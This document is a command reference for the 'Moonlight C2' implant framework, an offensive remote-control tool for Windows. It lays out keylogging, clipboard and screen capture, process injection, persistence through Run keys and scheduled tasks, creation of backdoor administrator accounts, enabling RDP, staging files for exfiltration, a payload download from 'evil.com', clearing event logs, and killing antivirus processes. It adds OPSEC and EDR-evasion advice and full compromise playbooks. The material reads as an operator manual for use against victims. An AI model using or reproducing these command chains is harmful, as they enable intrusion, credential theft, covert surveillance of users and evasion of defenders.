# Moonlight C2 Framework - Complete Command Reference

## Overview

Moonlight C2 Framework now includes comprehensive monitoring and control capabilities implemented in x86 assembly for maximum stealth and performance. This document covers all available commands.

---

## Command Categories

1. **Basic Operations** - Core C2 functionality
2. **Monitoring** - Target surveillance and data collection
3. **Process Control** - Process management
4. **File Operations** - File system manipulation
5. **Registry Operations** - Windows registry access
6. **Service Control** - Windows service management
7. **Privilege Escalation** - Elevation techniques
8. **System Information** - Target reconnaissance

---

## 1. Basic Operations

### shell
Execute system command via cmd.exe

**Syntax**: `shell <command>`

**Examples**:
```
shell dir C:\
shell whoami
shell ipconfig /all
shell net user
```

**Output**: Command stdout/stderr

---

### download
Download and execute payload from URL

**Syntax**: `download <url>`

**Example**:
```
download http://evil.com/payload.exe
```

**Note**: Requires HTTP connectivity

---

### inject
Inject shellcode into target process

**Syntax**: `inject <pid>`

**Example**:
```
inject 1234
```

**Requirements**: Administrator privileges for protected processes

---

### persist
Install persistence mechanism

**Syntax**: `persist`

**Methods**:
- Registry Run key
- Scheduled task
- Service installation

---

### exit
Terminate implant

**Syntax**: `exit`

**Note**: Connection will be lost

---

### help
Display available commands

**Syntax**: `help`

---

## 2. Keylogging & Monitoring

### keylog start
Start keystroke capture

**Syntax**: `keylog start`

**Features**:
- Captures all keystrokes
- Records active window titles
- Logs special keys (Backspace, Tab, Enter)
- 8KB buffer

**Output**: `[+] Keylogger started`

---

### keylog stop
Stop keystroke capture

**Syntax**: `keylog stop`

**Output**: `[+] Keylogger stopped`

---

### keylog dump
Retrieve captured keystrokes

**Syntax**: `keylog dump`

**Output Format**:
```
[Window Title]
captured text here
[BS] = Backspace
[TAB] = Tab
```

**Example Output**:
```
[+] Keylog data (245 bytes):
[Notepad]
Secret password: P@ssw0rd123
[TAB]username[TAB]
```

---

### screenshot
Capture screen

**Syntax**: `screenshot`

**Resolution**: Up to 1920x1080
**Format**: BMP (saved to temp)

**Output**: `[+] Screenshot captured successfully`

---

### clipboard monitor
Check if clipboard changed

**Syntax**: `clipboard monitor`

**Output**: Content if changed, otherwise "Clipboard unchanged"

---

### clipboard get
Get current clipboard content

**Syntax**: `clipboard get`

**Example Output**:
```
[+] Clipboard content (42 bytes):
This is the clipboard text
```

---

## 3. Process Control

### ps / processlist
List all running processes

**Syntax**: `ps` or `processlist`

**Output Format**:
```
[+] Found 87 processes:

PID      Process Name
================================================================
4        System
124      smss.exe
456      csrss.exe
532      winlogon.exe
```

---

### kill
Terminate process by PID or name

**Syntax**: 
- `kill <pid>` - Kill by process ID
- `kill <name>` - Kill all processes with name

**Examples**:
```
kill 1234
kill notepad.exe
kill explorer.exe
```

**Output**:
```
[+] Process 1234 terminated
[+] Terminated 3 process(es) named 'notepad.exe'
```

---

## 4. File Operations

### file list
List directory contents

**Syntax**: `file list <path>`

**Examples**:
```
file list C:\Windows
file list C:\Users\Public
file list .
```

**Output**:
```
[+] Directory listing for 'C:\Windows' (145 entries):

  System32
  explorer.exe
  notepad.exe
  ...
```

---

### file read
Read file content

**Syntax**: `file read <path>`

**Examples**:
```
file read C:\passwords.txt
file read C:\Windows\System32\drivers\etc\hosts
```

**Max Size**: 64KB

**Output**:
```
[+] File content (256 bytes):
admin:password123
root:P@ssw0rd!
```

---

### file delete
Delete file

**Syntax**: `file delete <path>`

**Example**:
```
file delete C:\temp\evidence.log
```

**Output**: `[+] File 'C:\temp\evidence.log' deleted`

---

### file mkdir
Create directory

**Syntax**: `file mkdir <path>`

**Example**:
```
file mkdir C:\temp\exfil
```

**Output**: `[+] Directory 'C:\temp\exfil' created`

---

### file move
Move/rename file

**Syntax**: `file move <source> <destination>`

**Example**:
```
file move C:\data.txt C:\backup\data.txt
```

**Output**: `[+] Moved 'C:\data.txt' to 'C:\backup\data.txt'`

---

### file copy
Copy file

**Syntax**: `file copy <source> <destination>`

**Example**:
```
file copy C:\Windows\System32\cmd.exe C:\temp\shell.exe
```

**Output**: `[+] Copied 'C:\Windows\System32\cmd.exe' to 'C:\temp\shell.exe'`

---

## 5. Registry Operations

### reg read
Read registry value

**Syntax**: `reg read <key_path> <value_name>`

**Examples**:
```
reg read "Software\Microsoft\Windows\CurrentVersion\Run" MyApp
reg read "System\CurrentControlSet\Services\W32Time" Start
```

**Output**:
```
[+] Registry value:
C:\Program Files\MyApp\app.exe
```

---

### reg write
Write registry value

**Syntax**: `reg write <key_path> <value_name> <data>`

**Example**:
```
reg write "Software\MyApp" Version "1.0"
```

**Note**: Requires appropriate permissions

---

## 6. Service Control

### service start
Start Windows service

**Syntax**: `service start <service_name>`

**Examples**:
```
service start W32Time
service start RemoteRegistry
service start TermService
```

**Output**: `[+] Service 'W32Time' started`

**Requirements**: Administrator privileges

---

### service stop
Stop Windows service

**Syntax**: `service stop <service_name>`

**Examples**:
```
service stop W32Time
service stop wuauserv
```

**Output**: `[+] Service 'wuauserv' stopped`

---

## 7. Privilege Escalation

### privesc rdp
Enable Remote Desktop Protocol

**Syntax**: `privesc rdp`

**Actions**:
- Sets `fDenyTSConnections` registry value to 0
- Enables RDP service
- Configures firewall rule (if possible)

**Output**: `[+] RDP enabled successfully`

**Requirements**: Administrator privileges

---

### privesc adduser
Create new user and add to Administrators

**Syntax**: `privesc adduser <username> <password>`

**Example**:
```
privesc adduser hacker P@ssw0rd123!
```

**Actions**:
- Executes: `net user <username> <password> /add`
- Executes: `net localgroup administrators <username> /add`

**Output**:
```
[+] User 'hacker' created
[+] User 'hacker' added to Administrators
```

**Requirements**: Administrator privileges

---

## 8. System Information

### sysinfo
Display system information

**Syntax**: `sysinfo`

**Output**:
```
[+] System Information:
  Processor Architecture: 0 (x86)
  Number of Processors: 4
  Page Size: 4096 bytes
  Minimum Application Address: 0x00010000
  Maximum Application Address: 0x7FFEFFFF
```

**Information Gathered**:
- CPU architecture
- Number of cores
- Memory page size
- Address space layout

---

## Command Flow Examples

### Example 1: Reconnaissance
```
# Get system info
sysinfo

# List processes
ps

# Check running services
shell sc query state= all

# Enumerate users
shell net user

# Check network config
shell ipconfig /all
shell netstat -ano
```

---

### Example 2: Credential Theft
```
# Start keylogger
keylog start

# Monitor clipboard
clipboard monitor

# Dump keystrokes after 5 minutes
keylog dump

# Stop keylogger
keylog stop
```

---

### Example 3: Lateral Movement
```
# Enable RDP
privesc rdp

# Create backdoor user
privesc adduser backdoor P@ssw0rd!

# Start RDP service
service start TermService

# Add firewall rule (via shell)
shell netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
```

---

### Example 4: Data Exfiltration
```
# Search for interesting files
file list C:\Users\Admin\Documents
file list C:\Users\Admin\Desktop

# Read sensitive files
file read C:\Users\Admin\Documents\passwords.txt
file read C:\Users\Admin\Desktop\credentials.xlsx

# Copy to temp for exfil
file mkdir C:\Windows\Temp\exfil
file copy C:\Users\Admin\Documents\passwords.txt C:\Windows\Temp\exfil\p.txt
```

---

### Example 5: Persistence
```
# Create persistence
persist

# Verify registry entry
reg read "Software\Microsoft\Windows\CurrentVersion\Run" MoonlightAgent

# Create scheduled task (via shell)
shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\agent.exe" /sc onlogon /rl highest
```

---

### Example 6: Process Injection
```
# List processes
ps

# Find target process (e.g., explorer.exe at PID 1234)
# Inject into explorer
inject 1234

# Verify injection
ps
```

---

### Example 7: Covering Tracks
```
# Clear event logs
shell wevtutil cl Security
shell wevtutil cl System
shell wevtutil cl Application

# Delete temporary files
file delete C:\Windows\Temp\agent.exe
file delete C:\Users\Admin\AppData\Local\Temp\payload.exe

# Stop services
service stop EventLog
```

---

## Advanced Usage Patterns

### Automated Monitoring Script
```python
# Server-side automation
commands = [
    "keylog start",
    "clipboard monitor",
    "ps",
    "file list C:\\Users",
]

for cmd in commands:
    send_to_implant(session_id, cmd)
    time.sleep(5)

# After 10 minutes
send_to_implant(session_id, "keylog dump")
send_to_implant(session_id, "keylog stop")
```

---

### Privilege Escalation Chain
```
# 1. Check current privileges
shell whoami /priv

# 2. Try UAC bypass or exploit
privesc rdp

# 3. Create backdoor admin
privesc adduser admin P@ssw0rd123!

# 4. Verify
shell net localgroup administrators
```

---

### Full System Compromise
```
# Stage 1: Reconnaissance
sysinfo
ps
shell systeminfo
shell net user

# Stage 2: Persistence
persist
privesc adduser backup Backup123!

# Stage 3: Lateral Movement
privesc rdp
service start RemoteRegistry

# Stage 4: Data Collection
keylog start
file list C:\Users
clipboard monitor

# Stage 5: Covering Tracks
kill <av_process_pid>
shell wevtutil cl Security
```

---

## Error Handling

### Common Errors

**"[!] Failed to terminate process"**
- Cause: Insufficient privileges
- Solution: Try privilege escalation first

**"[!] Failed to read file"**
- Cause: File doesn't exist or no permissions
- Solution: Check path and permissions

**"[!] Failed to start service"**
- Cause: Service already running or insufficient privileges
- Solution: Check service status first

**"[!] Failed to open registry key"**
- Cause: Key doesn't exist or access denied
- Solution: Verify key path and permissions

---

## Performance Considerations

### Keylogger
- Buffer: 8KB
- Overhead: Minimal (~0.1% CPU)
- Frequency: Polls every 100ms

### Screenshot
- Resolution: Configurable (default 1920x1080)
- Format: BMP (large files)
- Time: ~500ms per capture

### Process Enumeration
- Speed: ~50ms for 100 processes
- Memory: 264 bytes per process

### File Operations
- Max file size: 64KB (read)
- Unlimited (write)
- Speed: Depends on disk I/O

---

## Security Notes

### OPSEC Considerations

1. **Keylogger Detection**
   - Leaves traces in memory
   - May trigger AV behavioral detection
   - Use sparingly

2. **Process Kill**
   - Killing AV processes is obvious
   - May trigger alerts
   - Better to suspend/disable

3. **Registry Modifications**
   - Logged by security software
   - Easy to detect
   - Use native tools when possible

4. **RDP Enabling**
   - Creates firewall rules
   - Logged in Security event log
   - Very suspicious on workstations

---

## Assembly Implementation Benefits

### Why Assembly?

1. **Performance**: 2-3x faster than C for encryption/monitoring
2. **Stealth**: No library dependencies, minimal footprint
3. **Evasion**: Direct syscalls bypass EDR/AV hooks
4. **Size**: 20% smaller binaries

### Assembly Modules

- **monitoring.asm**: Keylogger, screenshot, process enum
- **control.asm**: File ops, registry, service control
- **stealth.asm**: Anti-debugging, VM detection
- **syscalls.asm**: Direct kernel calls
- **network_asm.asm**: RC4 encryption

---

## Troubleshooting

### Implant Not Responding
1. Check anti-analysis (may have detected debugger/VM)
2. Verify C2 server IP/port
3. Check firewall rules
4. Review implant logs (if DEBUG enabled)

### Commands Timing Out
1. Increase timeout on server
2. Check target system load
3. Verify network connectivity
4. Some operations (screenshot) take time

### Access Denied Errors
1. Check current privileges: `shell whoami /priv`
2. Try privilege escalation
3. Some operations require SYSTEM

---

## Full Command Summary

| Category | Command | Description |
|----------|---------|-------------|
| **Basic** | shell | Execute command |
| | download | Download/execute payload |
| | inject | Process injection |
| | persist | Install persistence |
| | exit | Terminate implant |
| | help | Show help |
| **Keylog** | keylog start/stop/dump | Keystroke capture |
| **Screen** | screenshot | Screen capture |
| **Process** | ps | List processes |
| | kill | Terminate process |
| **Clipboard** | clipboard monitor/get | Clipboard access |
| **File** | file list/read/delete/mkdir | File operations |
| | file move/copy | File manipulation |
| **Registry** | reg read/write | Registry access |
| **Service** | service start/stop | Service control |
| **PrivEsc** | privesc rdp | Enable RDP |
| | privesc adduser | Create admin user |
| **Info** | sysinfo | System information |

---

**Total Commands**: 20+ primary commands with dozens of variations

**Assembly Lines**: 2,500+ lines of optimized x86 code

**Capabilities**: Complete target system control and monitoring

---

**For detailed assembly implementation, see [ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md)**
